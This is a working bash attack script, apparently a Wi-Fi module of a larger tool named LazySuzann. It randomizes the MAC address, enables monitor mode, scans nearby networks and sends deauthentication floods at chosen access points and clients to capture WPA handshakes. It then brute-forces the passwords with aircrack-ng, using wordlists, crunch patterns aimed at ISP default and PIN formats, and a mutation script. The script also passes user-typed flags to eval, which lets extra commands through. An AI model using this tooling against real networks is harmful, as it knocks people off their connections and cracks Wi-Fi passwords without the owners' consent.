#!/bin/bash

RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
NC='\033[0m'


wifi_banner() {
  clear
  echo -e "${YELLOW}"
  echo "╔═════════════════════════════════════════════════╗"
  echo "           Smash'n Grab Wi-Fi Module 🔓            "
  echo "╚═════════════════════════════════════════════════╝"
  echo -e "${NC}"
}

select_interface() {
  wifi_banner
  echo -e "${GREEN}🔍 Scanning for wireless interfaces...${NC}"

  interfaces=($(iw dev | awk '$1=="Interface"{print $2}'))

  if [ ${#interfaces[@]} -eq 0 ]; then
    echo -e "${RED}[!] No wireless interfaces found. Exiting.${NC}"
    exit 1
  fi

  echo
  echo -e "${YELLOW}Available interfaces:${NC}"
  for i in "${!interfaces[@]}"; do
    echo " $((i+1))) ${interfaces[$i]}"
  done

  echo
  read -p "Select an interface to use [1-${#interfaces[@]}]: " iface_index
  iface_index=$((iface_index - 1))

  IFACE="${interfaces[$iface_index]}"
  MON_IFACE="${IFACE}mon"

  echo -e "${YELLOW}[*] Changing MAC address of $IFACE...${NC}"
  sudo ip link set "$IFACE" down
  sudo macchanger -r "$IFACE" >/dev/null 2>&1
  sudo ip link set "$IFACE" up
  echo -e "${GREEN}[+] MAC address randomized.${NC}"

  echo -e "${YELLOW}[*] Killing interfering processes...${NC}"
  sudo airmon-ng check kill >/dev/null 2>&1

  echo -e "${YELLOW}[*] Putting ${IFACE} into monitor mode...${NC}"
  sudo airmon-ng start "$IFACE" >/dev/null 2>&1

  # Confirm monitor mode worked
  if ip link show "$MON_IFACE" >/dev/null 2>&1; then
    echo -e "${GREEN}[+] Monitor mode enabled: $MON_IFACE${NC}"
  else
    echo -e "${RED}[!] Failed to enable monitor mode. Exiting.${NC}"
    exit 1
  fi
}

stop_monitor_mode() {
  echo -e "${YELLOW}[*] Stopping monitor mode on $MON_IFACE...${NC}"
  sudo airmon-ng stop "$MON_IFACE" >/dev/null 2>&1

  if ip link show "$MON_IFACE" >/dev/null 2>&1; then
    echo -e "${RED}[!] Failed to stop monitor mode. Interface still active.${NC}"
  else
    echo -e "${GREEN}[+] Monitor mode stopped. Interface reverted.${NC}"
  fi

  # Optionally allow interface reselection
  read -p "Do you want to select a new interface? (y/n): " resel
  if [[ "$resel" == "y" || "$resel" == "Y" ]]; then
    select_interface
  fi
}

trap_ctrl_c() {
  echo -e "${RED}\n[!] Caught interrupt. Cleaning up...${NC}"
  stop_monitor_mode
  exit 1
}

cracking_method_menu() {
  local selected_cap="$1"

  # Display main cracking options
  echo -e "${YELLOW}Choose cracking method for $selected_cap:${NC}"
  echo " 1) 🔑 Basic Wordlist Attack - Uses a wordlist to brute force the password."
  echo " 2) 💣 Crunch Generator Attack - Custom pattern generation, e.g., area codes or PINs."
  echo " 3) 🧠 Custom password-tools Attack - Uses a custom script to enhance cracking."
  echo " 4) 🔙 Back to Capfile Menu"
  echo
  read -p "Option: " crack_option

  case $crack_option in
    1)
      # Wordlist attack
      echo -e "${YELLOW}[*] You selected: Basic Wordlist Attack.${NC}"
      read -p "Enter path to wordlist: " wordlist
      echo -e "${YELLOW}[*] Running aircrack-ng with wordlist: $wordlist...${NC}"
      aircrack-ng -w "$wordlist" "$selected_cap"
      ;;
    2)
      # Crunch Generator attack (with BSSID extraction)
      echo -e "${YELLOW}[*] Extracting BSSID from cap file...${NC}"
      bssid=$(aircrack-ng "$selected_cap" 2>/dev/null | grep -m1 -oE '([0-9A-F]{2}:){5}[0-9A-F]{2}')

      if [[ -z "$bssid" ]]; then
        echo -e "${RED}[!] Failed to extract BSSID from cap file. Cannot continue.${NC}"
        cracking_method_menu "$selected_cap"  # Return to the menu
        return
      fi

      echo -e "${GREEN}[✓] Found BSSID: $bssid${NC}"
      echo
      echo -e "${YELLOW}Choose a brute force pattern:${NC}"
      echo " 1) 📞 Area Code Attack (e.g., 705%%%%%%)"
      echo " 2) 🔐 8-Digit PIN Attack (00000000-99999999)"
      echo " 3) 📶 Bell Default (Bell%%%%)"
      echo " 4) 🏠 HomeHub Format (HomeHub@2023)"
      echo " 5) ✍️  Custom Pattern"
      echo " 6) 🔙 Back"
      read -p "Pick pattern [1-6]: " pattern_option

      case $pattern_option in
        1)
          # Area Code attack (705%%%%%%)
          read -p "Enter area code prefix (e.g., 705): " prefix
          echo -e "${YELLOW}[*] Launching Area Code attack from ${prefix}000000 to ${prefix}999999...${NC}"
          crunch 10 10 -t "${prefix}%%%%%%%" | aircrack-ng -w - "$selected_cap" -b "$bssid"
          ;;
        2)
          # 8-Digit PIN attack
          echo -e "${YELLOW}[*] Launching 8-Digit PIN attack (00000000-99999999)...${NC}"
          crunch 8 8 -t %%%%%%%% | aircrack-ng -w - "$selected_cap" -b "$bssid"
          ;;
        3)
          # Bell Default attack
          echo -e "${YELLOW}[*] Launching Bell Default attack (Bell%%%%)...${NC}"
          crunch 8 8 -t Bell%%%% | aircrack-ng -w - "$selected_cap" -b "$bssid"
          ;;
        4)
          # HomeHub Format attack
          echo -e "${YELLOW}[*] Launching HomeHub Format attack (HomeHub@2023)...${NC}"
          crunch 12 12 -t HomeHub@2023 | aircrack-ng -w - "$selected_cap" -b "$bssid"
          ;;
        5)
          # Custom Pattern
          read -p "Enter full crunch pattern (use % for numbers): " pattern
          total_len=$((${#pattern}))
          echo -e "${YELLOW}[*] Launching custom pattern attack...${NC}"
          crunch "$total_len" "$total_len" -t "$pattern" | aircrack-ng -w - "$selected_cap" -b "$bssid"
          ;;
        6)
          # Back option
          echo -e "${YELLOW}[*] Returning to cracking menu...${NC}"
          cracking_method_menu "$selected_cap"  # Return to main menu
          return
          ;;
        *)
          # Invalid option handling
          echo -e "${RED}[!] Invalid choice. Returning to menu...${NC}"
          sleep 1
          cracking_method_menu "$selected_cap"
          return
          ;;
      esac
      ;;
        3)
      echo -e "${YELLOW}[*] Launching password-tools cracking module...${NC}"
      echo
      echo " Choose mutation strategy:"
      echo "  1) 🤘 LEET Transformation (--leet)"
      echo "  2) 🔢 Add Prefix (--prefix)"
      echo "  3) 🔚 Add Suffix (--suffix)"
      echo "  4) 🔁 Combine All (--leet --prefix --suffix)"
      echo "  5) 🔍 Custom Flags"
      echo "  6) 🔙 Back"
      echo
      read -p "Option [1-6]: " tool_option

      case $tool_option in
        1)
          echo -e "${YELLOW}[*] Using --leet only...${NC}"
          # ./password-tools/ eventually set proper directory to serve password scripts
          python3 enhancer-aircrack.py --leet | aircrack-ng -w - "$selected_cap"
          ;;
        2)
          read -p "Enter prefix to add: " prefix
          echo -e "${YELLOW}[*] Adding prefix '$prefix'...${NC}"
          python3 enhancer-aircrack.py --prefix "$prefix" | aircrack-ng -w - "$selected_cap"
          ;;
        3)
          read -p "Enter suffix to add: " suffix
          echo -e "${YELLOW}[*] Adding suffix '$suffix'...${NC}"
          python3 enhancer-aircrack.py --suffix "$suffix" | aircrack-ng -w - "$selected_cap"
          ;;
        4)
          read -p "Enter prefix: " prefix
          read -p "Enter suffix: " suffix
          echo -e "${YELLOW}[*] Using all mutations...${NC}"
          python3 enhancer-aircrack.py --leet --prefix "$prefix" --suffix "$suffix" | aircrack-ng -w - "$selected_cap"
          ;;
        5)
          read -p "Enter custom flags (e.g. --leet --suffix 123): " custom_flags
          echo -e "${YELLOW}[*] Running with: $custom_flags${NC}"
          eval python3 enhancer-aircrack.py $custom_flags | aircrack-ng -w - "$selected_cap"
          ;;
        6)
          cracking_method_menu "$selected_cap"
          ;;
        *)
          echo -e "${RED}[!] Invalid option. Returning...${NC}"
          sleep 1
          cracking_method_menu "$selected_cap"
          ;;
      esac
      ;;
    4)
      # Go back to capfile menu
      capfile_menu
      ;;
    *)
      # Invalid choice handling
      echo -e "${RED}[!] Invalid choice. Returning to menu...${NC}"
      cracking_method_menu "$selected_cap"
      ;;
  esac
}

capfile_menu() {
  wifi_banner
  echo -e "${GREEN}[+] Scanning for .cap files...${NC}"

  # Enable nullglob to prevent '*.cap' being passed as a literal string
  shopt -s nullglob
  capfiles=(*.cap)

  # Check if there are no .cap files
  if [ ${#capfiles[@]} -eq 0 ]; then
    echo -e "${RED}[!] No .cap files found in this directory.${NC}"
    sleep 2
    wifi_menu
    return
  fi

  # Check for valid handshakes
  valid_caps=()
  for cap in "${capfiles[@]}"; do
    echo -e "${YELLOW}[*] Checking $cap for valid handshake...${NC}"
    # Run aircrack-ng and check for "1 handshake"
    handshake_output=$(aircrack-ng "$cap" 2>&1)
    if echo "$handshake_output" | grep -q "1 handshake"; then
      valid_caps+=("$cap")
    fi
  done

  # Check if no valid handshakes are found
  if [ ${#valid_caps[@]} -eq 0 ]; then
    echo -e "${RED}[!] No valid handshakes found in the .cap files.${NC}"
    sleep 2
    wifi_menu
    return
  fi

  # Show valid cap files with handshakes
  echo -e "${YELLOW}Select a capture file to crack:${NC}"
  for i in "${!valid_caps[@]}"; do
    echo " $((i+1))) [✓] ${valid_caps[$i]}"
  done

  echo
  read -p "Select a file [1-${#valid_caps[@]}]: " cap_choice
  cap_choice=$((cap_choice - 1))
  selected_cap="${valid_caps[$cap_choice]}"

  echo -e "${GREEN}Selected: $selected_cap${NC}"

  cracking_method_menu "$selected_cap"
}


wifi_menu() {
  wifi_banner

  echo -e "${GREEN}Choose an attack method:${NC}"
  echo " 1) 🚀 Fast BSSID Scan (airodump-ng)"
  echo " 2) 📡 Capture Handshake (airodump + deauth)"
  echo " 3) 🔓 Wordlist Bruteforce (aircrack-ng)"
  echo " 4) 🔙 Return to LazySuzann Main Menu"
  echo " 5) 📴 Disable Monitor Mode on $MON_IFACE"
  echo
  read -p "Pick an option [1-5]: " wifi_choice

  case $wifi_choice in
    1)
      echo -e "${YELLOW}[*] Scanning and capturing BSSIDs...${NC}"
      rm -f capture-01.csv capture-01.cap >/dev/null 2>&1
      SCAN_TIME=60

      echo -e "${YELLOW}[*] Running airodump-ng for $SCAN_TIME seconds...${NC}"
      airodump-ng -w capture --output-format csv "$MON_IFACE" >/dev/null 2>&1 &
      AIDUMP_PID=$!

      sleep "$SCAN_TIME"
      kill "$AIDUMP_PID" >/dev/null 2>&1

      sleep 1
      echo -e "${GREEN}[+] Scan complete. Networks captured in capture-01.csv${NC}"
      wifi_menu
      ;;
    2)
      if [ ! -f capture-01.csv ]; then
        echo -e "${RED}[!] No scan results found. Please run option 1 first.${NC}"
        sleep 2
        wifi_menu
        return
      fi

      echo -e "${GREEN}📶 Known Networks from last scan:${NC}"
      bssids=()
      ssids=()
      channels=()

      IFS=$'\n'
      ap_lines=($(awk '/^BSSID/ {found=1; next} /^Station MAC/ {exit} found {print}' capture-01.csv))

      if [ ${#ap_lines[@]} -eq 0 ]; then
        echo -e "${RED}[!] No access points found in the scan.${NC}"
        sleep 2
        wifi_menu
        return
      fi

      for line in "${ap_lines[@]}"; do
        bssid=$(echo "$line" | cut -d',' -f1 | xargs)
        channel=$(echo "$line" | cut -d',' -f4 | xargs)
        essid=$(echo "$line" | cut -d',' -f14 | xargs)

        [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] || continue

        bssids+=("$bssid")
        channels+=("$channel")
        ssids+=("$essid")
      done

      for i in "${!bssids[@]}"; do
        printf " %2d) BSSID: ${YELLOW}%s${NC} | Channel: ${GREEN}%s${NC} | SSID: %s\n" $((i+1)) "${bssids[$i]}" "${channels[$i]}" "${ssids[$i]}"
      done

      echo
      read -p "Select a target [1-${#bssids[@]}]: " target_index
      target_index=$((target_index - 1))

      bssid="${bssids[$target_index]}"
      channel="${channels[$target_index]}"
      essid="${ssids[$target_index]}"

      echo -e "${YELLOW}[*] Launching handshake capture on $essid ($bssid) on channel $channel...${NC}"

      capfile="capture-$(date +%s)"
      # shellcheck disable=SC2207
      echo -e "${YELLOW}[*] Running airodump-ng for $SCAN_TIME seconds...${NC}"
      timeout 120 xterm -e "airodump-ng -c $channel --bssid $bssid -w $capfile $MON_IFACE" &
      DUMP_PID=$!

      sleep 10

      echo -e "${YELLOW}[*] Sending deauth packets to trigger handshake...${NC}"
      timeout 30 xterm -e "aireplay-ng --deauth 35 -a $bssid $MON_IFACE" &

      # Wait for scan to complete, check for stations continuously
      # shellcheck disable=SC2167
      for i in {1..10}; do
        echo -e "${YELLOW}[*] Checking for connected stations...${NC}"
        # shellcheck disable=SC2207
        station_lines=($(awk -v bssid="$bssid" -F',' '
          /Station MAC/ {found=1; next}
          found && $1 ~ /^[0-9A-Fa-f:]{17}$/ && $6 ~ bssid { print $1 }
        ' capture-01.csv))

        if [ ${#station_lines[@]} -gt 0 ]; then
          echo -e "${GREEN}[+] Detected stations:${NC}"
          for i in "${!station_lines[@]}"; do
            echo " $((i+1))) ${station_lines[$i]}"
          done

          # Select a station
          read -p "Select a station to deauth [1-${#station_lines[@]}]: " station_index
          station_index=$((station_index - 1))
          target_station="${station_lines[$station_index]}"
          echo -e "${YELLOW}[*] Deauthing station: $target_station${NC}"

          # Deauth the target station
          timeout 120 xterm -e "aireplay-ng --deauth 50 -a $bssid -c $target_station $MON_IFACE" &
          break
        else
          echo -e "${RED}[!] No stations found yet. Retrying...${NC}"
        fi

        sleep 5  # wait 5 seconds before checking again
      done

      wait $DUMP_PID  # Wait for airodump-ng to complete
      echo -e "${GREEN}[+] Handshake capture complete.${NC}"

      echo -e "${GREEN}[+] Capture complete. Checking for handshake...${NC}"
      aircrack-ng "$capfile-01.cap" | grep -q "handshake"

      echo -e "${YELLOW}[*] Verifying capture with hcxpcapngtool...${NC}"

      hcxpcapngtool -o "$capfile.hccapx" "$capfile-01.cap" >/dev/null 2>&1

      if [[ -s "$capfile.hccapx" ]]; then
        echo -e "${GREEN}[✓] Valid handshake captured! Saved as $capfile-01.cap${NC}"
        sleep 10
        wifi_menu
      else
        echo -e "${RED}[✗] No valid handshake detected. Retrying may help.${NC}"
        sleep 10
        wifi_menu
      fi
      ;;
    3)
      capfile_menu
      trap trap_ctrl_c INT
      ;;
    4)
      echo -e "${YELLOW}Returning to LazySuzann...${NC}"
      sleep 1
      stop_monitor_mode
      bash LazySuzann.sh
      ;;
    5)
      stop_monitor_mode
      wifi_menu
      ;;
    *)
      echo -e "${RED}Invalid selection. Try again.${NC}"
      sleep 1
      # First select interface
      select_interface

      wifi_menu
      ;;
  esac
}

trap trap_ctrl_c INT

# First select interface
select_interface

# Then show menu
wifi_menu